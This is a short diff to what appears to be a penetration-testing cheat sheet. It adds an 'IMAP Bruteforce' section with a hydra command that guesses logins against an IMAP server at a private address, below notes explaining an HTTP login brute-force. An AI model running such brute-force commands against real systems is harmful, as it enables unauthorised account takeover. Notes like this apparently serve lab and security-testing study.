@@ -83,3 +83,8 @@ Let’s break the commands down.
 - MachineIP = the target
 - http-get = Service
 - /protected/ = the webpage with login
+
+#### IMAP Bruteforce:
+```sh
+hydra -l userlist.txt -P defaultpw imap://192.168.0.1/PLAIN
+```
